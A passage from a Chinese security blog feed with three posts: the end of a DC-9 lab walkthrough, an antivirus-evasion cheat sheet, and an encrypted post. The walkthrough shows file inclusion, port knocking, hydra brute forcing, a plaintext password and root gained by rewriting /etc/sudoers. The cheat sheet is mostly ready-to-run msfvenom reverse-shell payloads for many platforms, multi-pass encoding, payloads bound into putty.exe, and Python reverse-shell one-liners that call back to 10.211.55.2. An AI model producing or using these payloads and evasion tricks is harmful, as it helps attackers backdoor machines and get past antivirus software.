<p><img src="/2022/04/30/DC-9/7.png" alt="img"></p>
<p>有这样的字眼，可能有文件包含，试试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.168.137/welcome.php?file=../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/30/DC-9/8.png" alt="img"></p>
<p>确实有，然后我就不会做了，尴尬！！！<br>看看其他师傅的做法<br>有这么的一个文件与ssh端口有关knockd.conf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">view-source:http://192.168.168.137/welcome.php?file=../../../../../etc/knockd.conf</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/30/DC-9/9.png" alt="img"></p>
<p>我们用nmap对这3个端口进行访问就能开ssh的锁了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -p 7469 192.168.168.137</span><br><span class="line">nmap -sS -p 8475 192.168.168.137</span><br><span class="line">nmap -sS -p 9842 192.168.168.137</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/30/DC-9/10.png" alt="img"></p>
<p>开锁成功<br>使用hydra进行爆破，字典是users数据库中的账号和密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P password.txt  192.168.168.137 ssh</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/30/DC-9/11.png" alt="img"></p>
<p>有三个账号都上上看看有什么文件啥的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -a //可以看到隐藏的文件</span><br></pre></td></tr></table></figure>

<p>在janitor用户下发现了一些密码</p>
<p><img src="/2022/04/30/DC-9/12.png" alt="img"></p>
<p>接着用hydra继续爆破</p>
<p><img src="/2022/04/30/DC-9/13.png" alt="img"></p>
<p>又多了一个用户啊，登录看看<br>login：fredf<br>password：B4-Tru3-001<br>查看可用信息</p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><img src="/2022/04/30/DC-9/14.png" alt="img"></p>
<p>发现&#x2F;opt&#x2F;devstuff&#x2F;dist&#x2F;test&#x2F;test<br>去看看，直接执行没有什么反应，看看源文件</p>
<p><img src="/2022/04/30/DC-9/15.png" alt="img"></p>
<p>argv[1]是读取的文件，argv[2]是将argv[1]文件的内容写入的目标<br>ok，这里我们把东西写入&#x2F;etc&#x2F;sudoers</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;fredf ALL=(ALL)NOPASSWD: ALL&quot;</span> &gt; /tmp/sudoers</span><br><span class="line">sudo /opt/devstuff/dist/test/test /tmp/sudoers /etc/sudoers</span><br></pre></td></tr></table></figure>

<p>这样就ok啦</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>

<p>提权成功，然后就是取拿flag了</p>
<p><img src="/2022/04/30/DC-9/16.png" alt="img"></p>
<p>ALL CLEAR!!!!</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">DC系列到处就结束了，从中学到了很多的思路，流程什么的，收获很多，后面对学到的东西做个总结啥的，方便以后使用。</span><br><span class="line">本次的ssh锁可以说是本次的一个大收获呢，就这样把。</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>实践</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>免杀-工具篇</title>
    <url>/2022/05/11/%E5%85%8D%E6%9D%80-%E5%B7%A5%E5%85%B7%E7%AF%87/</url>
    <content><![CDATA[<h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><h3 id="常见参数"><a href="#常见参数" class="headerlink" title="常见参数"></a>常见参数</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">-p,-payload&lt;payload&gt;指定需要使用的payload</span><br><span class="line">-l,-list[module_type]列出指定模块的所有可用资源，模块类型包括：payloads，encoders, nops, all</span><br><span class="line">-n,-nopsled&lt;length&gt;为payload预先指定一个NOP滑动长度</span><br><span class="line">-f,-format&lt;format&gt;指定输出格式</span><br><span class="line">-e,-encoder[encoder]指定需要使用的encoder(编码器)</span><br><span class="line">-a,-arch&lt;architecture&gt;指定payload的目标架构,例如x86|x64|x86_64</span><br><span class="line">-platform&lt;platform&gt;指定payload的目标平台</span><br><span class="line">-s,-space&lt;length&gt;设定有效攻击载荷的最大长度,文件大小</span><br><span class="line">-b,-bad-chars&lt;list&gt;设定规避字符集，指定需要过滤的坏字符(&#x27;\x0f&#x27;、&#x27;\x00&#x27;)</span><br><span class="line">-i,-iterations&lt;count&gt;指定payload的编码次数</span><br><span class="line">-c,-add-code&lt;path&gt;指定一个附加的win32 shellcode文件</span><br><span class="line">-x, –template &lt; path&gt; 指定一个自定义的可执行文件作为模板,并将payload嵌入其中,就是捆绑的意思</span><br><span class="line">-k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">–payload-options 列举payload的标准选项</span><br><span class="line">-o, –out &lt; path&gt; 指定创建好的payload的存放位置</span><br><span class="line">-v, –var-name &lt; name&gt; 指定一个自定义的变量，以确定输出格式</span><br><span class="line">–shellest 最小化生成payload</span><br><span class="line">-h, –help 查看帮助选项</span><br><span class="line">–help-formats 查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure>

<h3 id="监听参数"><a href="#监听参数" class="headerlink" title="监听参数"></a>监听参数</h3><h4 id="防止假死与假session"><a href="#防止假死与假session" class="headerlink" title="防止假死与假session"></a>防止假死与假session</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> ExitOnSession <span class="literal">false</span>   //可以在接收到seesion后继续监听端口，保持侦听。</span><br></pre></td></tr></table></figure>

<h4 id="防止session意外退出"><a href="#防止session意外退出" class="headerlink" title="防止session意外退出"></a>防止session意外退出</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> SessionCommunicationTimeout 0  //默认情况下，如果一个会话将在5分钟（300秒）没有任何活动，那么它会被杀死,为防止此情况可将此项修改为0</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> SessionExpirationTimeout 0 //默认情况下，一个星期（604800秒）后，会话将被强制关闭,修改为0可永久不会被关闭</span><br></pre></td></tr></table></figure>

<h4 id="handler后台持续监听"><a href="#handler后台持续监听" class="headerlink" title="handler后台持续监听"></a>handler后台持续监听</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; exploit -j -z</span><br></pre></td></tr></table></figure>

<h4 id="payload的可持续化"><a href="#payload的可持续化" class="headerlink" title="payload的可持续化"></a>payload的可持续化</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -e x86/shikata_ga_nai -b <span class="string">&quot;\x00&quot;</span> -i 5 -a x86 --platform win PrependMigrate=<span class="literal">true</span> PrependMigrateProc=svchost.exe -f exe -o  shell.exe</span><br></pre></td></tr></table></figure>

<p>PrependMigrate&#x3D;true PrependMigrateProc&#x3D;svchost.exe 使这个程序默认会迁移到svchost.exe进程</p>
<h4 id="绕过杀软"><a href="#绕过杀软" class="headerlink" title="绕过杀软"></a>绕过杀软</h4><p>使用reverse_https等payload时可以使用下列方法bypass部分杀软</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> EnableStageEncoding <span class="literal">true</span>   //尝试使用不同的编码器对stage进行编码，可能绕过部分杀软的查杀</span><br><span class="line">EnableStageEncoding =&gt; <span class="literal">true</span></span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> stageencoder x86/fnstenv_mov</span><br><span class="line">Stageencoder =&gt; x64/xor</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> stageencodingfallback <span class="literal">false</span></span><br><span class="line">stageencodingfallback =&gt; <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>使用reverse_tcp_rc4也有同样的效果，而且不能设置stageencoder选项，更稳定更方便</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp_rc4  lhost=10.211.55.2 lport=3333 RC4PASSWORD=tidesec  -f c</span><br></pre></td></tr></table></figure>

<h3 id="各平台payload生成"><a href="#各平台payload生成" class="headerlink" title="各平台payload生成"></a>各平台payload生成</h3><h4 id="window"><a href="#window" class="headerlink" title="window"></a>window</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Windows -f exe &gt; shell.exe</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>

<h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Linux -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

<h4 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform osx -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>

<h4 id="android"><a href="#android" class="headerlink" title="android"></a>android</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.apk</span><br><span class="line"></span><br><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 R &gt; test.apk</span><br></pre></td></tr></table></figure>

<h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -e cmd/powershell_base64 -i 3 -f raw -o shell.ps1</span><br></pre></td></tr></table></figure>

<h4 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h4><p>正向连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_hidden_bind_tcp LHOST=10.211.55.2 LPORT=3333  -f exe&gt; 1.exe</span><br></pre></td></tr></table></figure>

<p>反向连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333  -f exe&gt; 1.exe</span><br></pre></td></tr></table></figure>

<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><h4 id="lunix"><a href="#lunix" class="headerlink" title="lunix"></a>lunix</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Windows -f c</span><br></pre></td></tr></table></figure>

<h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Linux -f c</span><br></pre></td></tr></table></figure>

<h4 id="mac"><a href="#mac" class="headerlink" title="mac"></a>mac</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform osx -f c</span><br></pre></td></tr></table></figure>

<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><h4 id="Python反弹shell"><a href="#Python反弹shell" class="headerlink" title="Python反弹shell"></a>Python反弹shell</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.py</span><br><span class="line"></span><br><span class="line">msfvenom -a python -p python/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>

<h4 id="Python正向shell"><a href="#Python正向shell" class="headerlink" title="Python正向shell"></a>Python正向shell</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">python/python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.211.55.2&quot;,3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br><span class="line"></span><br><span class="line">python/python3 -c <span class="string">&quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&quot;</span>10.211.55.2<span class="string">&quot;,3333))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>

<h4 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>

<h4 id="lua"><a href="#lua" class="headerlink" title="lua"></a>lua</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_lua LHOST=10.211.55.2 LPORT=3333 -f raw -o shell.lua</span><br></pre></td></tr></table></figure>

<h4 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p ruby/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw -o shell.rb</span><br></pre></td></tr></table></figure>

<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.php</span><br></pre></td></tr></table></figure>

<h4 id="aspx"><a href="#aspx" class="headerlink" title="aspx"></a>aspx</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f aspx -o shell.aspx</span><br></pre></td></tr></table></figure>

<h4 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>

<h4 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>

<h4 id="war"><a href="#war" class="headerlink" title="war"></a>war</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

<h4 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p nodejs/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw -o shell.js</span><br></pre></td></tr></table></figure>

<h3 id="Handlers"><a href="#Handlers" class="headerlink" title="Handlers"></a>Handlers</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD &lt;Payload name&gt;</span><br><span class="line"><span class="built_in">set</span> LHOST 10.211.55.2</span><br><span class="line"><span class="built_in">set</span> LPORT 3333</span><br><span class="line"><span class="built_in">set</span> ExitOnSession <span class="literal">false</span></span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure>

<h3 id="自编码处理"><a href="#自编码处理" class="headerlink" title="自编码处理"></a>自编码处理</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom --list encoders //所有编码方式</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -e x86/shikata_ga_nai -b <span class="string">&quot;\x00&quot;</span> -i 15 -f</span><br><span class="line">exe -o payload2.exe //使用x86/shikata_ga_nai对payload进行编码</span><br></pre></td></tr></table></figure>

<h3 id="自捆绑免杀"><a href="#自捆绑免杀" class="headerlink" title="自捆绑免杀"></a>自捆绑免杀</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -x putty.exe -f exe -o payload3.exe //将payload与putty.exe捆绑在一起</span><br></pre></td></tr></table></figure>

<h3 id="自捆绑-编码"><a href="#自捆绑-编码" class="headerlink" title="自捆绑+编码"></a>自捆绑+编码</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -e x86/shikata_ga_nai -x putty.exe -i 15 -</span><br><span class="line">f exe -o payload4.exe</span><br></pre></td></tr></table></figure>

<h3 id="多重编码"><a href="#多重编码" class="headerlink" title="多重编码"></a>多重编码</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 LHOST=10.211.55.2 LPORT=3333 -f raw |</span><br><span class="line">msfvenom -e x86/alpha_upper -i 10 -f raw | msfvenom -e x86/countdown -i 10 -x putty.exe -f exe -o payload5.exe</span><br></pre></td></tr></table></figure>

<p>shikata_ga_nai编码20次，alpha_upper编码10次，countdown编码10次</p>
<h2 id="msf-evasion"><a href="#msf-evasion" class="headerlink" title="msf evasion"></a>msf evasion</h2><h3 id="生成exe"><a href="#生成exe" class="headerlink" title="生成exe"></a>生成exe</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">show evasion(查看evasion的模块)</span><br><span class="line">use windows/windows_defender_exe</span><br><span class="line"><span class="built_in">set</span> filename payload.exe</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST</span><br><span class="line"><span class="built_in">set</span> LPORT</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h2 id="Shellter"><a href="#Shellter" class="headerlink" title="Shellter"></a>Shellter</h2><h2 id="BackDoor-Factory"><a href="#BackDoor-Factory" class="headerlink" title="BackDoor-Factory"></a>BackDoor-Factory</h2><p>参考来源:<a href="https://github.com/TideSec/BypassAntiVirus">https://github.com/TideSec/BypassAntiVirus</a></p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>常用代码汇总（施工中。。。）</title>
    <url>/2022/04/22/%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="a9a8804e2619fc985a759a6fe4f98947a4a4fb242fe2cdd736cb4f30b44fbfb8">bd25ed9264b080267271e137e33d0ce1adc3c6b2bac6ceb0572e33f68e974c7905c6aaefbc98d1b1c7b751a6e56f7abcb20b71ddde29c6bf2e78acf32d3d80c3f27d3dd3452272eb3192913e5dbda96b21e65c508fb3cfe2331691314b42653807e5f4b561924c8873fd9d616a5806abb835d73b3ebfe290611aee7e84df57eb0732acc85206be77a2a4a466bbff155a93beca7f88cb62657598ff81f3979a182baf965be77343cb0b75cfc75e415f0ecb6c2799d1a19e8239c1ef87b833832b3e444b23ef7e909ecfcdbb30344781fd1ed499a09a37538ca6b2c876ea3d69dce484ba310a1c962a384e51e657ae5d462e1bccca86de7ce70098e238dab47610b45926f092d7caa09acc2c03f88a2044947b2185d0b504be7cde12f2f854625f4c7577ff4edefff5c289f569759223e22e5ec2861427cdf7bfbb5154a68a806f34d8f645625a2b919b362656ea051b8f9db5bfabe97930a0e6fdd0640658d4cfbd358fb1571ddfa0307ea4edc34aa81d4d2ee969762cee3c3184ec4ceae74e9dfc4e2a4e5ff8cc5b5a9c031672e8a473a6fc3dcf5efdad5478d612e20518d77bc49b3db5d14c637ebddf8fee7fa9b6a859d78ae69dbb79867d7c6896f152fbb0a6dd61f67c9d0afb7401f95a31cc4ffdaf1417abd83fb00b29d45645e8a03c2a5b665b984e5ecbad270c48bed1c46391b17346cdfe0981cda37983ea934696c5a7df5536c48cfc76b8176c5fb6ccbc17300a974e51c05df45d3c78921c58842c4eca54f4bd11bc9fcc9040e59f5c34dce680ac1fa85884d4c42ee1131cd939542c343e9843999d095dfeedb5c76cb6bfdd960c14d7d6fedebb9e1091c70951aec7fe6618e73b3f81dc51031d45bad99896bf7acb3395a2c2d9536a89fd432eef04ba4ac068e71ef3dab4950eb46cdc5b5a8f21cb78a60808f00fdc2271f9347aa4bfaf764e104d02abdd9611a0e62b6dbeabd19c408605092792751f7493e3d85114d192d298a7f859675ad8306e64d842f87152d4c122d03c55dc5db09cc614d213d47d96b416543c0095b9e4405aca8128d372a9d14688306e1e0516a06dab7d940218e1a0b992c5b8b96feb939ca2a0ed9d4f1461a402facefc6890277ba56a6309f4186d1215a24e2e962507ccd3b5174ef5860c609a6fe5c521b151ebe3cc0e1401bdff041578510f8ca3113130caeb29efa3dd8b004be3b2c218a0640ed4ffa604309ddd64e43de230342472e377b63ed26032ea57fcd5e078c1e82b88eb585f43c77fd36caeb8e782d93af65043df2c3148ad911b6885bfeb0e37fe243c14ba8f528b729fa1eb0d1eb79dc5c8edc0acee7e644a42d94e161cdb4373f05858d526d4f8575998957e1edb6ab7f36f89e8aaf760a69b4dfffaabcedba6ffd4a48d39e9fd123c70221264fdaf5cdf056430605a93b1a1e8354502ee8f39824bad74d28171607414aa17eab4e9c652008cf0be06fc31b22977389c9b829ebc2d6b7a39a3ff5898c61bf30566191358324a0934829b4f84403b2175f48f3e1eea829df8268301eb75c4edcf87c0b3fc7acbfa499a2415803896e779877b231c72a79d2663408ea90dd6177afe695be788f16c7d69428455a8475944936a7d22adae33e509acdf52e4f367ca4532d237810952b0039481e5bd0b68e14b2daa603211743c1e71202cd86376fad06bb5d0ef2ee4f2bb8cd605b02347f67cb8fe9ecc50bb7aac7656c3c68ba3804688044af36e537fb8eef052ce1bea436cf9f4ee5803679083eb974198bc8813c36d39bc9649c7f00b7e8455da16f32eab0b99d904c72b6b67d73119a5b4ee9fe26f514e24249bfcf7cc1dd2ff09b99e66cad085f561497e468ba6d5912729edd76729bd27a8e624f3b4517201dcb8c7be55d680b02806693f2775f272e22f57345f4f6ee6bb7ade0dd81ddb624031203bf55801653f99a6d2ed0636508ca52d930d647eb459d199425e92df25e1b599c1318f93867e869fbda919e2b7dc3451592adec87428a65ae44deea801c2da2a146e751e10018ac8c369652808630d510bccf617c3163c1c200ade52d498b825ae8e43a8bcb607d11dcffabaa9663a9227c72bd66e779cb607b24ed4c06d42a6a7a945861d5e9d8a47f63b3398d3565deea69ea31453a7bc2e7969cda90323d7d0e1121ba217ce60b776392f641bc40b87a8aed3026aa06ed854c4fe299e0bc165ab0475ab8afe581b1bc44f8f269a60cb0c6570566a02530bdf21772c2d384add88a5c9e7d0c00026a1d9752c9832e712c163000ae429cb26602e5e883e340d06189aadb0ec02972e34f0c0d7bd2a4354a7871013bd92748f2596ea3ea80384d1c7a8ea226476a4928e6a54208117d8a0a5980df8ff9ed338adf2b082825a8bf0220a4105b489fda44469a12c50bc674fbb7ac3957040cb951336d9290fc6111beb90cf4f729e3866c0c6711b5baaff3d75e9d8160183605a1aa55708787a6ff130d90269d76a91f1fbdc852eb2a425fa2e555c7fc267cce0212d5aecec7601ccd6bc1ebee09da760f5c63541a0ed5f50f69828bc3384924a3ed6e36d5f6c62f47dba05f95333436e0f1660e2079fcf27900ef76c3b188761a2a18cc752bf9708f707fa936bdd3a518c36406cc339a00d7ba9dafbbdd8b0f380e2a01ea38a9e0f3b4f0b456b2e424dfbedb7823245a2ec0eac0c94df58293f8cdd795ebca2caae75267bfeb49120ff782e62b2cf92f4e6a8a02baacc353541e148160866e8bcc239869ce2278900ad535f19deed16e4530660e97e710ee9df4bb6c5623d4ba58ea936b3b9e36f48e3df01ec3a050397c0406689f9b0a4e989667d5615105e2456ef55ca9c8bb13b9dfe39614ab410bee583c7cd56931b3a8625b0127198d22304aea035962ed26579a0a726c90de4df3f6aadcea10e402c631e99b9f2b98065924233018e2d8f9b58b3eef6d56936dff10f2f52d02f4f3d243d80eb40b260e4fd3f0c73e887dc6db283ac6b57fd81b0f7ca332a4d1bc171f02de841c57bdd28b21c26f1e841e410f821bdeddc001d7bd4abccfc4a39a5dad2eb8302f02bf6b767fcb978a28d36abca8ef89d23d5eaf05af0658397ece9110193d510ed7f3d45a38bdc9dbe53a334721da4a36a79101ff728012b97990129f1d73cc8ba50b0a28f2fe192f72bc099193dd79a13fffd64b3d2cf951dd39739224ffd11a08de6244c9b339545005bee96b8ef240b8d31b4e3f012b75c5487befbc23edbf8015455cf7cbf4e349fea2d7de353d8e084e110796666e312e048f7634e7ecf335fa13a6d07535d51370e238ce10f3149fbb2d8453e9518b14fac6c97442b0c80562c1c25e3b8880632fe60bd2aca7831e5d90f245c97a945970f804e6f8a7a743bcd7518b974b8752af58b32e6284c39d1eb5fe8b686ecd956e1b5c3a904ee0553cd7dc36dccb504da67622a4eea14a67b72c486966ec2c4d67d6b63dba7ad4346d77a12df4d04495bd615a2a874342cb0b017256e7b238fd5482a9ac0a8fd7dcf417a6122cecacc4d4c3cfbd2906df549c4a5631a6af83d9df817800f894862d32ac62f2cf8c1b4061be93cd0952f7a52447473fe2495f34fab9aefc1041a7ce23a1cef2a083a203830ff71d23d8360954b0c5a376407b6e5f01376a2f59bf1e79443de2fa8a2ba0078566ecf520325d22ce06d7d64dc4378c1b472ce1f039e099fcbfab409dc8879fdd0a597cd625c1fc333a17049bb4ef287508bfd7c2c4682d4dd582248ea027ecb6a79757d1b4befaebc8e28e41b964978346056b83e9a26a7306bad188f2551ed408b354c7d6569c795692747c1de172082297c7c65ee6ff0ba39a25f59f8d799141ba5c6caa9c608c3ca572eca75d74e9d830bd1a3413b4b8c9db94af3dddf8f385b08b22eb63fa4591e2bf09cc682c625b2c7be1b3ef79d415eaeb1586089f306617238616d08602aa7500054da91ff9c3cf4c4e82c0f09ca8efcd99bef1714782c6b683fb1cdcec86ab1002c964bd1bc2764d79d1ec5008a7e36001041d6c029be9e509a6bfb98d220645db8da9840bdb8e8ed4de2df460fe95f6baad1ed3c3e346aa3ec4c20780dbcfe31538672ca26d77d2b1ee1e39909dab1bae13876e601bc741ec0d199f82e77a98672f12c6d685205ba52cedb4eacfbf22d3ed68c0883f50fdb855c6e0c0acfb7730a84daae020cc8cdb0b38ce24b211372a908d9eabea22a1cf637bff5d283219e05946c9ef24b8411e8ca31bd98c206ab4f7b2d88e11f52096d7a8a7fdf6811077dc3bf7cdd942b34d9f487bf812b270d355c9672ee4c92c97eecea77b027e8ec2cb1a4818afadb35963f704922092b46701522a651fc545a09254bcf224732301762a915e4f59e51f33cb734ad0a8f3152d2c4d298967eed55bd7044fde36ced3dbf099cbd79c7620aea6377980b768ca2ed6b8a9d405f1f9309a990ed34b9ac3f726b653dec6e66142d9a7a91c496561829f3b67a6dd3edece5daa932fa479c74217682cb40a688653b4b2b7157f573f7c9462936ebf57b867231db9f350309aa6f54bbb29d60d2324fba9ba83bbc979625763d8e33c9e060a0017a890ba1c25a72810635a7336412a4e730b1099eeb8961da743a7cc48f09a65d0d0ac1e6175b2bbc5a336fbb445f45123ce5d2a1c704c9b4487f14a22353c2e555751687d8ab96449484d20b68cd8e22c106369a1c896f7b27f8ec216ee1ce77a599faed166d6190c036a89aa3ed06094afa0054a5cec3c108ae997271f207e0438f195689332efa044fc7cd0da2267822764b02ca8febfd61559aea812e50603a8c00a4191ee71f5f6756b5d002babcc858ccad2527973c65c5bd994c67e1275d0b39af3a228ee0b347c7a50edc037b7d4dad6667a591408a8dae746d9a579d858eb6855a7a595c3b6337432dcb120fcfb39bba2961a0a7c0a22c224ba20fea66bee4bad9635f88ac100fc668116cd0b7d12dac71718d7d977ba9fc8bf4013638d4072d865c65c9db2bb836c1b42ed47778b704844d75afd19b7a955fc4c2d40c2d4d25d401332cde3a176312d722e2be8ed1e18c5de767a3d4d597a6ff0a035beec1ecd2966e36cd2efedd76cd5e4c4891a